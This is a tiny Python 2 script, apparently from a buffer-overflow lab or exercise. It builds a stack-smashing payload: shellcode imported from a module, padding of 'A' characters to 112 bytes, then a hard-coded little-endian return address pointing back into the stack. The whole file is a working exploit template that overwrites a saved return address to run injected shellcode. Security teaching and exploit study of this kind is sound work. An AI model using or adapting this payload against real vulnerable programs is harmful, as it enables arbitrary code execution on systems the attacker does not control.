from shellcode import shellcode
from struct import pack

addr = 0xbffe9988 - 0x6c;

print shellcode + 'A'*(112-len(shellcode)) + pack('<I', addr)
